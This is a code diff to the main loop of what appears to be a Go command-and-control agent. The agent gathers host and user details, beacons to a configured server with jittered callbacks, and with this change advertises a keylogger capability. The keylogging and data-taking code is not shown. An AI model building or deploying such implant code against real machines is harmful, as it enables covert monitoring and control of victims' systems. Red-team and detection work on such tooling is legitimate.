@@ -104,8 +104,10 @@ func main() {
 		}
 	}()
 
-	agentID, hostname, username := client_utils.GenerateAgentMetadata()
-	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)
+	hostname, username := client_utils.GenerateAgentMetadata()
+	filepath := client_utils.GetExecutablePath()
+	capabilities := append(client_utils.DefaultCapabilities(), "keylogger")
+	logger.Logf(logger.Info, "Collected startup metadata. Hostname: %v. Username: %v", hostname, username)
 	osType, osArch, osVersion, cpus, memory := client_utils.GetOSInfo()
 
 	for {
@@ -122,15 +124,18 @@ func main() {
 		logger.Logf(logger.Info, "Beacon connected")
 
 		ip := client_utils.GetLocalIP(beacon, *client_utils.ClientConfig.ServerIP, *client_utils.ClientConfig.ServerPort, *client_utils.ClientConfig.TransportProtocol)
-		nextCallback := client_utils.CalculateNextCallbackTime(*client_utils.ClientConfig.CallbackFrequency, *client_utils.ClientConfig.CallbackJitter)
-		err = client_utils.HandleConfigurationRequest(
-			beacon, agentID, hostname, username, ip,
-			osType, osArch, osVersion, cpus, memory,
+		agentID, err := client_utils.HandleStartupRequest(beacon, filepath, hostname, username, ip, osType, osArch, osVersion, cpus, memory, capabilities)
+		if err != nil {
+			client_utils.HandleError(beacon, "startup", err)
+			continue
+		}
+		sleepDuration, err := client_utils.HandleConfigurationRequest(
+			beacon, agentID,
 			*client_utils.ClientConfig.ServerIP,
 			*client_utils.ClientConfig.ServerPort,
 			*client_utils.ClientConfig.CallbackFrequency,
 			*client_utils.ClientConfig.CallbackJitter,
-			nextCallback, *client_utils.ClientConfig.TransportProtocol,
+			*client_utils.ClientConfig.TransportProtocol,
 		)
 		if err != nil {
 			client_utils.HandleError(beacon, "configuration", err)
@@ -153,13 +158,12 @@ func main() {
 
 		beacon.Close()
 		logger.Logf(logger.Info, "Beacon successful")
-		sleepDuration := time.Until(nextCallback)
 
 		if sleepDuration > 0 {
-			logger.Logf(logger.Info, "Sleeping until next callback: %v (in %.2fs)", nextCallback.Format(time.RFC3339), sleepDuration.Seconds())
+			logger.Logf(logger.Info, "Sleeping for %.2fs", sleepDuration.Seconds())
 			time.Sleep(sleepDuration)
 		} else {
-			logger.Logf(logger.Warning, "Next callback time already passed (%.2fs ago). Skipping sleep.", -sleepDuration.Seconds())
+			logger.Logf(logger.Warning, "Server returned non-positive sleep duration. Skipping sleep.")
 		}
 	}
 }
